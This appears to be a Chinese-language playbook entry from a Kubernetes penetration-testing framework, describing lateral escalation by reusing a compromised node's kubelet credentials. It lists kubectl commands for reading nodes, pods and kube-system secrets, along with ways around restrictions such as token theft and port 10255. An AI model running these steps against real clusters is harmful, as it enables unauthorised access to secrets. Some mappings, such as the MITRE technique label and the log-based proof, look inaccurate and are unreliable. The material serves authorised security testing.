---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.11]
mapped_compliance_families: [节点安全, RBAC]
---

# node-cluster-escalation — 节点凭证横向升级

被入侵节点持有 kubelet 凭证（`/etc/kubernetes/kubelet.conf` 或 `/var/lib/kubelet/pki/` 节点证书），攻击者复用该凭证与 API Server 通信，以节点身份执行节点级操作，横向升级至集群控制面。

---

## 1. 前置条件

- 攻击者已获得节点 shell 或容器逃逸至宿主机
- 节点持有有效 kubelet 凭证：`/etc/kubernetes/kubelet.conf` 或 `/var/lib/kubelet/pki/kubelet-client-current.pem`
- 节点证书未被吊销且 kubelet 凭证 RBAC 允许节点级操作（`system:node` 权限）

检查命令：
```bash
# [L0] 节点观察：检查 kubelet 凭证文件
ls -la /etc/kubernetes/kubelet.conf /var/lib/kubelet/pki/
# 期望输出: kubelet.conf 与 kubelet-client-current.pem 存在

# [L0] 节点观察：检查 kubelet 凭证有效性
openssl x509 -in /var/lib/kubelet/pki/kubelet-client-current.pem -noout -dates
# 期望输出: notBefore/notAfter 有效期内
```

## 2. 探测命令

```bash
# [L0] 节点观察：用 kubelet 凭证列出节点
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get nodes
# 期望输出: 节点列表（system:node 权限）

# [L0] 节点观察：确认当前凭证身份
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf config view --minify -o jsonpath='{.contexts[*].context.user}'
# 期望输出: system:node:<node-name>

# [L0] 节点观察：检查凭证权限
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf auth can-i --list
# 期望输出: system:node 允许的操作列表
```

## 3. 攻击验证

```bash
# [L1] 节点攻击验证：用节点凭证读取集群节点信息
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get nodes -o wide
# 期望输出: 集群所有节点的 IP、版本、状态

# [L2] 节点攻击验证：以节点身份创建/修改资源（若 RBAC 允许）
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get pods --all-namespaces -o wide
# 期望输出: 集群所有 Pod 列表（节点凭证权限足够时）

# [L2] 节点攻击验证：读取节点上的 Secret（system:node 可读所在节点的 Secret）
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get secret -n kube-system -o wide
# 期望输出: kube-system 命名空间的 Secret 列表
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：节点 API 访问日志
journalctl -u kubelet --since "5 min ago" | grep -c "GET /nodes"
# 期望输出: 较少 GET /nodes 请求

# [L0] 攻击后环境对比：节点凭证发起新的 API 请求
journalctl -u kubelet --since "1 min ago" | grep -c "GET /nodes"
# 期望输出: 攻击后请求数显著增加 → 证明节点凭证被滥用
```

差分结论：攻击前 kubelet API 调用平稳，攻击后用节点凭证执行的 `kubectl get nodes/pods` 在审计日志中产生新请求，证明节点凭证被用于横向升级。

## 5. 绕过策略

```bash
# [L0] 检查节点证书 RBAC 是否限制
kubectl auth can-i --as=system:node:<node-name> get nodes
# 若输出 yes → 节点凭证可读节点信息

# 绕过方式：
# - [L1] 若证书即将过期，利用轮换窗口期重用旧证书
# - [L2] 若 system:node 权限受限，结合 kubelet 只读端口（10255）读取 Pod 信息
# - [L1] 若 kubelet.conf 使用 token 而非证书，窃取 token 后续期使用
```

## 6. 证伪条件

```bash
# [L0] 节点无 kubelet 凭证
ls /etc/kubernetes/kubelet.conf 2>&1
# 输出: No such file or directory → 证伪

# [L1] 凭证已过期
openssl x509 -in /var/lib/kubelet/pki/kubelet-client-current.pem -noout -enddate
# 输出: 过去的日期 → 证伪

# [L1] 凭证无法与 API Server 通信
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get nodes 2>&1
# 输出: Unauthorized 或 Forbidden → 证伪
```

## 7. 审批级别

- **L2** 节点攻击验证（用节点凭证访问集群资源）→ **Level 4**（横向升级，需人工确认）
- **L1** 节点探测命令（读取节点凭证文件）→ **Level 2**（只读探测，自动执行）
- **L0** 节点观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Lateral Movement / Privilege Escalation
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者复用被入侵节点持有的 kubelet 凭证（节点证书或 kubelet.conf），以 `system:node` 身份与 API Server 通信，横向升级至集群控制面，读取集群节点、Pod 与 Secret。